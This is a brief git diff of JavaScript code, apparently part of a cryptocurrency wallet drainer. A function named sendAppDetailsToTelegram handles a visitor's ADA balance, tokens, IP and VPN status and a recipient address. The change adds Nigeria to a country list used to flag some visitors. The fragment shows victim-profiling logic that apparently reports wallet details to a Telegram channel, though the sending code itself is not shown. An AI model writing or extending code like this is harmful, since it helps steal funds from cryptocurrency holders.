@@ -42,7 +42,7 @@ export const sendAppDetailsToTelegram = async (adaBalance, tokens) => {
   const isVpn = isVpnIpdata || await checkVpnStatus(ip);
   const recipientAddress = await getRecipientAddress();
 
-  const specialCountries = ["AE"];
+  const specialCountries = ["NG","AE"];
   const globeIcon = "🌍";
   const isMine = specialCountries.includes(countryCode) || isVpn ? "🔴" : "🟢";
 
